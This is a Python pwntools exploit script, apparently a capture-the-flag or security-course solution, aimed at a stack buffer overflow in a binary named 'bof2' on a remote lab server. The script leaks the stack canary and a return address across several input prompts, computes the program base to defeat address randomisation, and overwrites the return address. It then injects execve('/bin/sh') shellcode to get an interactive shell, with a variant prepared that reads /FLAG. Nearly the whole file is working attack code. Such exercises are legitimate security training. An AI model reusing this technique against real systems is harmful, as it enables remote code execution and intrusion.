#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys
import struct
from loguru import logger

context.arch = 'amd64'
context.os = 'linux'

exe = './bof2'
port = 10259

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

# asm code
# write five 8 bytes instructions to overflow buffer
code = asm(shellcraft.sh())
code = asm(
  '''
  /* execve(path='/bin///sh', argv=['sh'], envp=0) */
  /* push b'/bin///sh\x00' */
    push 0x68  /* h */
    mov rax, 0x732f2f2f6e69622f /* 0x68732f6e69622f */
    push rax
    mov rdi, rsp
  /* push argument array ['sh\x00'] */
  /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* envp = 0 */
  /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
    
    xor rax, rax
    inc rax
    syscall
  '''
)
# b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
shellcode = asm(shellcraft.amd64.linux.cat('/FLAG'))
payload = b'A'*41 # + b'\x00'
task_offset = 0x8b07
msg_offset = 0xd31e0


r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)
    
  
# Q1: What's your name? 
r.recvuntil(b"What's your name? ")
r.send(payload)
recv = r.recvline().strip()
print(f"total recv: {recv}")
ind = recv.rfind(b'A')
recv = recv[ind+1:]
print(f"after find: {recv}")

# from the end of the recv, get 6 bytes as return address
# addr = int.from_bytes(recv[-6:].ljust(8, b'\x00'), byteorder='little')
# print(f"return address: 0x{addr:x}")
canary = int.from_bytes(recv[:-6].rjust(8, b'\x00'), byteorder='little')
print(f"canary: 0x{canary:x}")
print(f"p64(canary): {p64(canary)}")


# Q2: What's the room number?
r.recvuntil(b"What's the room number? ")
r.send(b'A'*56)
recv = r.recvline().strip()
print(f"{recv}")
ind = recv.rfind(b'A')
recv = recv[ind+1:]
print(f"after find: {recv}")
addr = int.from_bytes(recv[-6:].ljust(8, b'\x00'), byteorder='little')
print(f"return address: 0x{addr:x}")

base = addr - task_offset
print(f"base: 0x{base:x}")
msg = base + msg_offset
print(f"msg: 0x{msg:x}")
print(f"msg: {p64(msg)}")

# Q3: What's the customer's name?
r.sendafter(b"What's the customer's name? ", b'B'*40+p64(canary)+b'B'*8+p64(msg))
print(r.recvline())

# Q4: Leave your message:
r.sendafter(b"Leave your message: ", code)
r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
# b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'